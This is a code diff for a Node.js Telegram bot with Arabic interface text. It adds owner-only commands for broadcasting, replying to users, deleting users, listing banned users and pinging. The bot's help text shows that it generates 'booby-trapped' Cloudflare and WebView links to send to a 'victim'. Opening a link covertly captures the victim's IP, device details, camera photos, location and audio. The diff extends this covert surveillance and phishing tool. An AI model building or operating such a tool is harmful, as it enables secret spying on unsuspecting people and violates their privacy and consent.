@@ -93,6 +93,16 @@ bot.on('message', async (msg) => {
     createLink(chatId, msg.text);
   }
 
+  // Interactive broadcast reply
+  if (msg?.reply_to_message?.text == "📢 اكتب الرسالة التي تريد إرسالها للجميع:" && chatId === BOT_OWNER) {
+    const text = msg.text;
+    let sent = 0, failed = 0;
+    for (const uid of users) {
+      try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; }
+    }
+    return bot.sendMessage(chatId, `✅ تم الإرسال للجميع\n✔️ ناجح: ${sent}\n❌ فشل: ${failed}`);
+  }
+
   users.add(chatId);
   saveUsers();
 
@@ -109,15 +119,21 @@ bot.on('message', async (msg) => {
     bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });
   }
 
-  // /broadcast (owner only)
-  if (msg.text && msg.text.startsWith("/broadcast ")) {
+  // /broadcast (owner only) — interactive or inline
+  if (msg.text && (msg.text === "/broadcast" || msg.text.startsWith("/broadcast "))) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    if (msg.text.trim() === "/broadcast") {
+      // Interactive: ask for message
+      return bot.sendMessage(chatId, "📢 اكتب الرسالة التي تريد إرسالها للجميع:", {
+        reply_markup: JSON.stringify({ force_reply: true })
+      });
+    }
     const text = msg.text.replace("/broadcast ", "");
     let sent = 0, failed = 0;
     for (const uid of users) {
       try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; }
     }
-    bot.sendMessage(chatId, `✅ تم الإرسال\nناجح: ${sent}\nفشل: ${failed}`);
+    bot.sendMessage(chatId, `✅ تم الإرسال للجميع\n✔️ ناجح: ${sent}\n❌ فشل: ${failed}`);
   }
 
   // /stats (owner only)
@@ -157,6 +173,49 @@ bot.on('message', async (msg) => {
     bot.sendMessage(chatId, `✅ تم رفع الحجب عن: \`${unbanId}\``, { parse_mode: "Markdown" });
   }
 
+  // /banned — list banned users (owner only)
+  if (msg.text == "/banned") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    if (banned.size === 0) return bot.sendMessage(chatId, "✅ لا يوجد مستخدمون محجوبون.");
+    const list = [...banned].map((id, i) => `${i + 1}. \`${id}\``).join("\n");
+    bot.sendMessage(chatId, `🚫 المحجوبون (${banned.size}):\n\n${list}`, { parse_mode: "Markdown" });
+  }
+
+  // /reply <id> <message> (owner only)
+  if (msg.text && msg.text.startsWith("/reply ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const parts = msg.text.replace("/reply ", "").split(" ");
+    const targetId = parseInt(parts[0]);
+    const replyText = parts.slice(1).join(" ");
+    if (isNaN(targetId) || !replyText) return bot.sendMessage(chatId, "⚠️ الاستخدام: /reply [id] [الرسالة]");
+    try {
+      await bot.sendMessage(targetId, `📩 رسالة من المالك:\n\n${replyText}`);
+      bot.sendMessage(chatId, `✅ تم إرسال الرد للمستخدم \`${targetId}\``, { parse_mode: "Markdown" });
+    } catch(e) {
+      bot.sendMessage(chatId, `❌ فشل الإرسال: ${e.message}`);
+    }
+  }
+
+  // /deleteuser <id> (owner only)
+  if (msg.text && msg.text.startsWith("/deleteuser ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const delId = parseInt(msg.text.replace("/deleteuser ", "").trim());
+    if (isNaN(delId)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
+    if (!users.has(delId)) return bot.sendMessage(chatId, "⚠️ المستخدم غير موجود في القائمة.");
+    users.delete(delId);
+    saveUsers();
+    bot.sendMessage(chatId, `🗑️ تم حذف المستخدم \`${delId}\` من القائمة.`, { parse_mode: "Markdown" });
+  }
+
+  // /ping (owner only)
+  if (msg.text == "/ping") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const start = Date.now();
+    const m = await bot.sendMessage(chatId, "🏓 Pong!");
+    const ms = Date.now() - start;
+    bot.editMessageText(`🏓 Pong! \`${ms}ms\``, { chat_id: chatId, message_id: m.message_id, parse_mode: "Markdown" });
+  }
+
   // /start
   if (msg.text == "/start") {
     const m = {
@@ -170,7 +229,7 @@ bot.on('message', async (msg) => {
   else if (msg.text == "/help") {
     let helpText = `📖 طريقة الاستخدام:\n\n1️⃣ اضغط "إنشاء رابط ملغم" أو /create\n2️⃣ أرسل الرابط الذي ستعيد التوجيه إليه\n3️⃣ ستحصل على رابطين:\n   • 🌐 رابط Cloudflare (يجمع كل المعلومات)\n   • 🖥️ رابط WebView\n4️⃣ أرسل الرابط للضحية\n5️⃣ عند الفتح تصلك فوراً:\n   - إشعار بالـ IP\n   - معلومات الجهاز\n   - صور الكاميرا\n   - الموقع الجغرافي\n   - تسجيل صوتي`;
     if (chatId === BOT_OWNER) {
-      helpText += `\n\n📌 أوامر المالك:\n/stats - إحصائيات البوت\n/users - قائمة المستخدمين\n/ban [id] - حجب مستخدم\n/unban [id] - رفع الحجب\n/broadcast [نص] - إرسال للجميع`;
+      helpText += `\n\n📌 أوامر المالك:\n/stats - إحصائيات البوت\n/users - قائمة المستخدمين\n/banned - قائمة المحجوبين\n/ban [id] - حجب مستخدم\n/unban [id] - رفع الحجب\n/reply [id] [رسالة] - رد على مستخدم\n/deleteuser [id] - حذف مستخدم من القائمة\n/broadcast - إرسال للجميع (تفاعلي)\n/ping - اختبار سرعة البوت`;
     }
     bot.sendMessage(chatId, helpText);
   }
